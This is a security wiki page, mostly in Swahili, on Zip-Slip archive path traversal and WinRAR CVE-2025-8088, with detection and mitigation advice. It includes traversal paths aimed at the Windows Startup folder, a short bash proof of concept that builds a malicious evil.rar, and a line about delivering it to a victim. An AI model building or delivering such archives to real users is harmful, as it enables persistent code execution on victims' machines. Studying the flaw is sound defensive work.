# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Overview

Mifumo mingi ya archive (ZIP, RAR, TAR, 7-ZIP, nk.) inaruhusu kila kipengee kubeba **njia yake ya ndani**. Wakati chombo cha kutoa kinaheshimu bila kujali njia hiyo, jina la faili lililotengenezwa likiwa na `..` au **njia kamili** (mfano `C:\Windows\System32\`) litandikwa nje ya directory iliyochaguliwa na mtumiaji. Aina hii ya udhaifu inajulikana sana kama *Zip-Slip* au **archive extraction path traversal**.

Matokeo yanatofautiana kutoka kwa kuandika tena faili za kawaida hadi kufikia moja kwa moja **remote code execution (RCE)** kwa kutupa payload katika eneo la **auto-run** kama vile folda ya *Startup* ya Windows.

## Root Cause

1. Mshambuliaji anaunda archive ambapo moja au zaidi ya vichwa vya faili vina:
* Mfuatano wa kusafiri wa jamaa (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Njia kamili (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
2. Mwathirika anatoa archive hiyo kwa chombo kilicho na udhaifu ambacho kinatumaini njia iliyoingizwa badala ya kuisafisha au kulazimisha kutoa chini ya directory iliyochaguliwa.
3. Faili inandikwa katika eneo linalodhibitiwa na mshambuliaji na kutekelezwa/kupakiwa wakati mfumo au mtumiaji anachochea njia hiyo.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR kwa Windows (ikiwemo `rar` / `unrar` CLI, DLL na chanzo cha kubebeka) ilishindwa kuthibitisha majina ya faili wakati wa kutoa. Archive ya RAR yenye uharibifu ikijumuisha kipengee kama:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
ingekuwa **nje** ya saraka ya pato iliyochaguliwa na ndani ya *Startup* ya mtumiaji. Baada ya kuingia, Windows inatekeleza kila kitu kilichopo hapo, ikitoa *persistent* RCE.

### Kuunda PoC Archive (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – hifadhi njia za faili kama zilivyo (usifute `./` za mbele).

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET iliripoti kampeni za spear-phishing za RomCom (Storm-0978/UNC2596) ambazo zilihusisha RAR archives zikitumia CVE-2025-8088 kupeleka backdoors zilizobinafsishwa na kuwezesha operesheni za ransomware.

## Detection Tips

* **Static inspection** – Orodhesha entries za archive na uweke alama jina lolote linalo na `../`, `..\\`, *absolute paths* (`C:`) au encodings zisizo za kawaida za UTF-8/UTF-16.
* **Sandbox extraction** – Fanya decompression kwenye directory inayoweza kutumika mara moja kwa kutumia extractor *salama* (e.g., Python’s `patool`, 7-Zip ≥ latest, `bsdtar`) na uthibitisha njia zinazotokana zinabaki ndani ya directory.
* **Endpoint monitoring** – Onyesha kwenye executable mpya zilizandikwa kwenye maeneo ya `Startup`/`Run` mara tu archive inafunguliwa na WinRAR/7-Zip/n.k.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13 inatekeleza usafi wa njia ipasavyo. Watumiaji lazima waishe kwa mkono kwa sababu WinRAR haina mfumo wa auto-update.
2. Extract archives with the **“Ignore paths”** option (WinRAR: *Extract → "Do not extract paths"*) when possible.
3. Fungua archives zisizoaminika **ndani ya sandbox** au VM.
4. Tekeleza application whitelisting na punguza ufikiaji wa kuandika wa mtumiaji kwenye directories za auto-run.

## Additional Affected / Historical Cases

* 2018 – Onyo kubwa la *Zip-Slip* kutoka Snyk lililoathiri maktaba nyingi za Java/Go/JS.
* 2023 – 7-Zip CVE-2023-4011 traversal inayofanana wakati wa `-ao` merge.
* Mantiki yoyote ya extraction ya kawaida inayoshindwa kuita `PathCanonicalize` / `realpath` kabla ya kuandika.

## References

- [BleepingComputer – WinRAR zero-day exploited to plant malware on archive extraction](https://www.bleepingcomputer.com/news/security/winrar-zero-day-flaw-exploited-by-romcom-hackers-in-phishing-attacks/)
- [WinRAR 7.13 Changelog](https://www.win-rar.com/singlenewsview.html?&L=0&tx_ttnews%5Btt_news%5D=283&cHash=a64b4a8f662d3639dec8d65f47bc93c5)
- [Snyk – Zip Slip vulnerability write-up](https://snyk.io/research/zip-slip-vulnerability)

{{#include ../banners/hacktricks-training.md}}
